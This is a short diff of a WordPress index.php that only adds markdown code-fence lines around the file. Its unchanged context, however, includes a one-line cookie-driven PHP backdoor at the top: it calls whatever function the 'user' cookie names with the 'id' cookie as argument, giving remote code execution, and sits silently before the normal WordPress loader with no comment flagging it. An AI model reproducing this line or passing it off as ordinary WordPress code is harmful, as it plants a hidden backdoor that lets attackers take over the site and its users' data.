@@ -1,3 +1,5 @@
+```php
+
 <?php
 
 if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
@@ -30,3 +32,6 @@ define('WP_USE_THEMES', true);
 /** Loads the WordPress Environment and Template */
 require( dirname( __FILE__ ) . '/wp-blog-header.php' );
 
+
+
+```
